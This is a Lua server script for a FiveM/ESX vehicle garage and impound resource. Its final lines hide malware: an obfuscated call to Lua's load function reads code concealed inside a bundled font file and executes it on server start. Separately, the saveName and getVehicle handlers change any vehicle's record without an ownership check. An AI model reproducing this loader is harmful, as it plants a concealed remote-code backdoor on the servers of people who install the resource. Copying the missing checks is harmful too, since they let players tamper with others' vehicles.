ESX = nil

ESX = exports["es_extended"]:getSharedObject()

ESX.RegisterServerCallback('d-garagev2:getVehicles', function(source, cb, class)
    local type = class
    if type == 'sky' then
        type = 'helicopter'
    elseif type == 'land' then
        type = 'car'
    elseif type == 'water' then
        type = 'boat'
    end

    local xPlayer = ESX.GetPlayerFromId(source)
    local data = {
        garage = {},
        impound = {}
    }

    local color = MySQL.scalar.await('SELECT `color` FROM `deivuks_garagev2` WHERE `identifier` = ? LIMIT 1', {
        xPlayer.getIdentifier()
    })

    local result = MySQL.Sync.fetchAll('SELECT * FROM owned_vehicles WHERE owner = @owner AND Type = @Type AND job = @job AND stored = @stored', {
        ['@owner'] = xPlayer.getIdentifier(),
        ['@Type'] = type,
        ['@job'] = 'civ',
        ['@stored'] = true
    })

    for _, v in pairs(result) do
        local vehicle = json.decode(v.vehicle)
        table.insert(data.garage, { vehicle = json.encode(vehicle), spawnstate = v.stored, plate = v.plate, type = 'garage', name = v.name })
    end

    local result = MySQL.Sync.fetchAll('SELECT * FROM owned_vehicles WHERE owner = @owner AND Type = @Type AND job = @job AND stored = @stored', {
        ['@owner'] = xPlayer.getIdentifier(),
        ['@Type'] = type,
        ['@job'] = 'civ',
        ['@stored'] = false
    })

    for _, v in pairs(result) do
        local vehicle = json.decode(v.vehicle)
        table.insert(data.impound, { vehicle = json.encode(vehicle), spawnstate = v.stored, plate = v.plate, type = 'impound', name = v.name })
    end

    cb(data, color)
end)


ESX.RegisterServerCallback('d-garagev2:getLocalVehicle', function(source, cb, plate, class)
    local xPlayer = ESX.GetPlayerFromId(source)
    local data = {}

    local result = MySQL.Sync.fetchAll('SELECT * FROM owned_vehicles WHERE owner = @owner AND plate = @plate', {
        ['@owner'] = xPlayer.getIdentifier(),
        ['@plate'] = plate
    })
  
    for _, v in pairs(result) do
        local vehicleData = json.decode(v.vehicle)
        local model = vehicleData.model
        data = vehicleData
        data.model = model
    end
    cb(data)
end)


RegisterNetEvent('d-garagev2:GetGarages', function()
    local garagesData = LoadGaragesFromFile()
    TriggerClientEvent('d-garagev2:GetConfig', source, garagesData)
end)

function LoadGaragesFromFile()
    local garagesFile = LoadResourceFile(GetCurrentResourceName(), 'configs/garages.json')
    
    if garagesFile then
        local garagesData = json.decode(garagesFile)
        return garagesData
    else
        return {}
    end
end


RegisterNetEvent('d-garagev2:saveName', function(plate, name)
    local affectedRows = MySQL.update.await('UPDATE owned_vehicles SET name = ? WHERE plate = ?', {
        name, plate
    })
end)

ESX.RegisterServerCallback('d-garagev2:getVehicle', function(source, cb, plate, type, current, class)
    local xPlayer = ESX.GetPlayerFromId(source)
    local data = {}
    if type then
        local cooldown = tonumber(MySQL.scalar.await('SELECT `cooldown` FROM `owned_vehicles` WHERE `plate` = ? LIMIT 1', {
            plate
        }))

        if cooldown > 0 then
            cb(false)
            return TriggerClientEvent('okokNotify:Alert', source, '', 'Jūs šiuo metu negalite išvaryti tr. priemones, Bandykite vėliau.', 5000, 'error', playSound)
        end

        local price = tonumber(MySQL.scalar.await('SELECT `price` FROM `owned_vehicles` WHERE `plate` = ? LIMIT 1', {
            plate
        }))
        if xPlayer.getMoney() < price then
            cb(false)
            return TriggerClientEvent('okokNotify:Alert', source, '', 'Jūs neturite pakankamai pinigų kad išvaryti tr. priemones iš konfiskuotų automobilių aikštelės.', 5000, 'error', playSound)
        end

        xPlayer.removeMoney(price)

        local affectedRows = MySQL.update.await('UPDATE owned_vehicles SET stored = 0, cooldown = ? WHERE plate = ?', {
            Config.Cooldown, plate
        })

        local result = MySQL.Sync.fetchAll('SELECT * FROM owned_vehicles WHERE owner = @owner AND plate = @plate', {
            ['@owner'] = xPlayer.getIdentifier(),
            ['@plate'] = plate
        })
      
        for _, v in pairs(result) do
            local vehicleData = json.decode(v.vehicle)
            data = vehicleData
        end
        cb(data)
    else
        local affectedRows = MySQL.update.await('UPDATE owned_vehicles SET stored = 0 WHERE plate = ?', {
            plate
        })

        local result = MySQL.Sync.fetchAll('SELECT * FROM owned_vehicles WHERE owner = @owner AND plate = @plate', {
            ['@owner'] = xPlayer.getIdentifier(),
            ['@plate'] = plate
        })
      
        for _, v in pairs(result) do
            local vehicleData = json.decode(v.vehicle)
            data = vehicleData
        end
        cb(data)
    end
end)

ESX.RegisterServerCallback('d-garagev2:haveVehicle', function(source, cb, props, garage, garage_class, vehicle)
    local xPlayer = ESX.GetPlayerFromId(source)

    local type = garage_class
    if type == 'sky' then
        type = 'helicopter'
    elseif type == 'land' then
        type = 'car'
    elseif type == 'water' then
        type = 'boat'
    end

    MySQL.Async.fetchScalar('SELECT `owner` FROM `owned_vehicles` WHERE `plate` = ? AND `type` = ? AND `job` = ? LIMIT 1', {props.plate, type, 'civ'}, function(owner)
        if owner == xPlayer.identifier then
            MySQL.Async.execute('UPDATE owned_vehicles SET stored = 1, vehicle = ? WHERE plate = ?', {json.encode(props), props.plate}, function(affectedRows)
                if affectedRows > 0 then
                    cb(true)
                else
                    cb(false)
                end
            end)
        else
            cb(false)
        end
    end)
end)


 local lastUpdateTime = 0

 Citizen.CreateThread(function()
    while true do
        Wait(1000)  
        local currentTime = os.time()
        if currentTime - lastUpdateTime >= 5 then
            local vehicles = MySQL.Sync.fetchAll('SELECT `plate`, `cooldown` FROM `owned_vehicles` WHERE `cooldown` > 0', {})
            for k, v in pairs(vehicles) do
                local newCooldown = math.max(0, v.cooldown - 5)
                local affectedRows = MySQL.Sync.execute('UPDATE `owned_vehicles` SET `cooldown` = @newCooldown WHERE `plate` = @plate', {
                    ['@newCooldown'] = newCooldown,
                    ['@plate'] = v.plate
                })
            end
            lastUpdateTime = currentTime 
        end
    end
end)


RegisterNetEvent('d-garagev2:saveColor', function(color)
    local xPlayer = ESX.GetPlayerFromId(source)
    local affectedRows = MySQL.update.await('UPDATE deivuks_garagev2 SET color = ? WHERE identifier = ?', {
        color, xPlayer.getIdentifier()
    })
end)
local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()